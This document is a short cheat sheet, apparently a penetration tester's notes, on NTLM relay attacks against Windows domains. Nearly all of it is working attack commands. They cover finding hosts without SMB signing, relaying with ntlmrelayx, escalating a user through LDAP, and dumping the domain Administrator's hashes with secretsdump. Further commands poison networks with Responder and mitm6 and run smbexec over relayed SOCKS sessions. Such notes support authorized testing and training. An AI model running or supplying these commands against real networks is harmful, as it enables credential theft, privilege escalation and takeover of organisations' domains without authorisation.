# How To NTLMRelay

## Notes
 - Configure /etc/proxychains.conf to not proxy DNS and use local port 1080:
   `#proxy_dns`
   `socks4 127.0.0.1 1080`   
 - Start ntlmrelayx with options socks:   
   `ntlmrelayx.py -tf targets.txt -smb2support -socks`  
 - Targets (systems without SMB signing) can be gathered with:   
   `crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt`   
 - Try to escalate a given user:   
   `ntlmrelayx.py -t ldap://dc.domain.local --escalate-user USER --remove-mic -smb2support`   
 - Run secretsdump on domain administrator:   
   `secretsdump.py winlab.csnc.ch/hostname$@dc.winlab.csnc.ch -just-dc -just-dc-user Administrator`   
   
 Note: For the poisoning of broadcast messages, run Responder at the same time, but with SMB and HTTP server disabled for Responder. This is not required if you do targeted relaying where you trigger the victims connection to your ntlmrelayx host.   
 - Start Responder.py with SMB and HTTP disabled: (disable them in /root/vkoch/Responder/Responder.conf)   
   `sudo /opt/Responder/Responder.py -I eth1 -w -r -f -d`   

## Using the socks connection
 - Once there is an authenticated socks connection (check with command "socks" in ntlmrelayx console), it can be used with proxychains:   
   `proxychains smbexec.py 'DOMAIN/user:gugus@<target-ip>'`   
   `proxychains secretsdump.py random@100.2.2.2`   
   
- If you relay a machine account:   
   `proxychains smbexec.py 'DOMAIN/MACHINE$:gugus@<target-ip>'`   

## IPv6 DHCP poisoning
- Start rogue DHCPv6, where you specify the domain of your target:   
  `mitm6 -d domain.local`   
- Start ntlmrelayx to e.g. target LDAP on the DC (for querying AD information):   
  `sudo ntlmrelayx.py -6 -t ldap://dc01 --no-smb-server -wh attacker-wpad -h`   
